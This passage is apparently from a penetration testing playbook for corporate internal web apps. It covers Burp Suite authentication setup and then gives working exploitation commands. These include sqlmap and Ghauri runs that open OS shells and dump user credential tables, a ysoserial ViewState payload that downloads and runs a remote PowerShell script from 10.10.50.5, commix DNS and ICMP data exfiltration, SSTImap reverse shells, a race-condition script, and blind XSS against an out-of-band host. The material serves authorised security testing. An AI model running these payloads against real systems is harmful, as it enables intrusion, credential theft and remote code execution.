## Part 5 — Phase 5: Manual testing & exploitation

### 5.1 Burp Suite Community — internal setup

**Corporate CA trust in Burp:** User options → TLS → Imported Certificate Authorities → Add → PEM of corp root. **Burp CA into system/browser trust:** export DER, convert to PEM, `update-ca-certificates`, import into Firefox.

**NTLM to target:** Project options → Sessions → Platform Authentication → Add. Destination `*.corp.internal`, type NTLMv2, username `user` (NOT `CORP\user`), password, domain `CORP`, domain hostname `WKSTN01`.

**Kerberos:**
```bash
cat > ~/krb5.conf <<'EOF'
[libdefaults]
  default_realm = CORP.INTERNAL
  forwardable   = true
  udp_preference_limit = 1
[realms]
  CORP.INTERNAL = { kdc = DC01.corp.internal ; admin_server = DC01.corp.internal }
[domain_realm]
  .corp.internal = CORP.INTERNAL
EOF
kinit user@CORP.INTERNAL
java -Djava.security.krb5.conf=$HOME/krb5.conf \
     -Djavax.security.auth.useSubjectCredsOnly=false \
     -jar burpsuite_community.jar
```
Then Project options → HTTP → Platform Authentication → Kerberos for `*.corp.internal`. Alternatively load the **Berserko** BApp which handles TGT inside Burp.

**Session Handling Rule** with a **macro**: for short sessions, per-request CSRF tokens, or rotating bearers. Record login → define extraction (e.g., `csrf_token` from HTML or `XSRF-TOKEN` cookie) → add Session Handling Rule "If out of session match on `Location: /login` → run macro → update current request".

**Match & Replace** for stubborn bearers: Proxy → Options → Regex `^Authorization:.*` → `Authorization: Bearer ${latest}`.

**Community-compatible extensions** (all load as JARs offline): **Autorize**, **Turbo Intruder**, **Param Miner**, **Hackvertor**, **JWT Editor**, **NTLM Challenger**, **SAML Raider**, **Logger++**, **Flow**, **HTTP Request Smuggler**, **Backslash Powered Scanner**, **ActiveScan++**, **Content Type Converter**, **Upload Scanner**, **Freddy** (deserialization detector).

**NTLM Challenger trick:** `curl -I https://app.corp.internal/aspnet_client/` → paste `WWW-Authenticate: NTLM TlRMTVNT...` into the extension → reveals NetBIOS domain, DNS domain, computer name, OS build — free internal recon.

### 5.2 Caido Community, OWASP ZAP, mitmproxy

- **Caido** — Rust, lighter RAM, web UI; HTTPQL filtering (`req.host.cont:"corp" and resp.code:200`); TLS/upstream config via Settings → Proxy/CA. Good for long-running recording and client demos.
- **ZAP** — fully open-source fallback with active scanner, AJAX spider, Zest/Groovy scripted session handling. `zap.sh -daemon` + `zap-cli` for full automation. Pre-stage add-ons under `~/.ZAP/plugin/`.
- **mitmproxy** — scriptable Python proxy, GSSAPI/SPNEGO passthrough, HAR/flow export:
  ```bash
  mitmproxy --mode regular@8080 --ssl-insecure
  mitmdump --mode regular@8080 --ssl-insecure -s har_dump.py --set hardump=./session.har
  KRB5_CONFIG=~/krb5.conf mitmdump --mode upstream:http://proxy.corp.internal:8080 --set upstream_auth=negotiate
  ```

### 5.3 sqlmap with NTLM

```bash
sqlmap -r request.txt \
       --auth-type=NTLM --auth-cred='CORP\user:P@ssw0rd!' \
       --batch --risk=3 --level=5 --disable-update \
       --threads=5 --delay=0.2 -p id,search,filter

# Chain through Burp to offload NTLM handling (when python-ntlm chokes on Py3)
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --batch --disable-update

# OS-level
sqlmap -r request.txt --os-shell
sqlmap -r request.txt --os-pwn --msf-path=/opt/msf
sqlmap -r request.txt --file-read='C:/inetpub/wwwroot/web.config'

# Tampers for fragile/legacy backends
sqlmap -r request.txt --tamper=between,randomcase,space2comment --level=5 --risk=3
```

`--disable-update` is mandatory. Pin parameters with `-p` — blasting all at risk=3/level=5 can DoS an Oracle box. Use `--technique=T` (time-based) if the app returns 500s for everything.

### 5.4 Ghauri — sqlmap alternative

```bash
ghauri -r request.txt --auth-type NTLM --auth-cred 'CORP\user:pass' \
       --level 3 --batch --threads 1 --force-ssl
ghauri -r request.txt -p id --current-user --current-db --is-dba
ghauri -r request.txt --dump -D corpdb -T Users -C username,password,role
```

Less-noisy than sqlmap; better on blind/second-order; use `--ignore-code 401,403` for endpoints that return errors on unauthed replays.

### 5.5 Dalfox with self-hosted OAST

```bash
dalfox file urls.txt --skip-bav --custom-payload payloads.txt \
       -b oast.corp.internal \
       -C "JSESSIONID=...; XSRF-TOKEN=..." \
       --proxy http://127.0.0.1:8080 --follow-redirects \
       --output-format json -o xss.json

dalfox url "https://app.corp/search?q=test" --cookie-from-raw request.txt \
       -b oast.corp.internal --deep-domxss

# Pipe mode
cat params.txt | gf xss | dalfox pipe -b oast.corp.internal \
       -H "Authorization: Bearer eyJ..." --skip-bav
```

Blind payloads fire to `oast.corp.internal/xss/...` — ensure interactsh is up **before** scanning.

### 5.6 Autorize — authorization / IDOR testing

Two sessions (high-priv admin cookie in proxied browser + low-priv cookie in Autorize config). Browse as admin → Autorize replays each request with low-priv and with no-cookie → diffs responses. Results:

- 🟢 **Bypassed** — low-priv got same response as admin = broken AuthZ finding.
- 🟡 **Is enforced???** — manually verify.
- 🔴 **Enforced** — correctly rejected.

Tune noise with an enforcement detector (unique "access denied" page fingerprint). Combine with a Session Handling Rule macro for per-request CSRF-rotating apps.

### 5.7 Turbo Intruder — race conditions

HTTP/2 single-packet attack skeleton:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           engine=Engine.BURP2)
    for _ in range(3): engine.queue(target.req)        # warm
    for i in range(30): engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting): table.add(req)
```

Multi-endpoint race (coupon + checkout): queue `applyCoupon` + 20× `checkout` on the same gate. Target must support HTTP/2; for HTTP/1.1 internal apps use `Engine.THREADED` with last-byte sync.

### 5.8 Param Miner — hidden params, headers, cache poisoning

Right-click → Param Miner → **Guess headers** / **Guess params** / **Guess cookies** / **Guess JSON params**. Finds `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Host`, debug/impersonate headers. Cache poisoning: look for `X-Cache:`/`Age:` in responses, append cache-buster `?cb=RAND` when testing prod. Old internal Squid caches are fragile — lower thread count.

### 5.9 ysoserial / ysoserial.net — deserialization

**Java:**
```bash
java -jar ysoserial-all.jar CommonsCollections5 'nslookup test.oast.corp.internal' > cc5.bin
java -jar ysoserial-all.jar URLDNS 'http://test.oast.corp.internal' > urldns.bin    # detection first
```

**.NET ViewState with known MachineKey** (leaked via web.config / LFI / actuator/heapdump):
```
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -c iwr http://10.10.50.5/r.ps1|iex" \
  --path="/default.aspx" --apppath="/" \
  --decryptionalg="AES" --decryptionkey="..." \
  --validationalg="SHA1" --validationkey="..." --islegacy --isencrypted
```

Discovery sinks in Burp: Base64 blobs in `__VIEWSTATE`/cookies, `Content-Type: application/x-java-serialized-object`, AMF (`application/x-amf`), RMI/T3/IIOP on high ports, Kryo/fastjson/Jackson `enableDefaultTyping`. Use the **Freddy** extension for passive detection + interactsh OOB confirmation. Start with `URLDNS` / `ObjectDataProvider` to confirm deserialization *happens* before escalating.

### 5.10 commix, SSTImap

```bash
# commix — OS command injection
commix -r request.txt --batch --level=3
commix -u "https://app.corp/ping?ip=127.0.0.1" --technique=T --tamper=space2ifs --batch
commix -r request.txt --dns-server=oast.corp.internal     # OOB exfil
commix -r request.txt --icmp-exfil="ip_src=10.10.50.5,ip_dst=TARGET"

# SSTI — SSTImap (Python 3 fork of tplmap)
python3 sstimap.py -u 'https://app.corp/greet?name=John*' -s
python3 sstimap.py -u 'https://app.corp/greet?name=John*' --os-shell
python3 sstimap.py -u 'https://app.corp/x?p=*' --reverse-shell 10.10.50.5 4444
```

Engine fingerprint quick-test: `{{7*7}}` → 49 (Jinja/Twig), `${7*7}` → 49 (Freemarker/Mako/ERB), `{7*7}` → 49 (Smarty). Polyglot `${{<%[%'"}}%\.` errors out usefully on most engines.

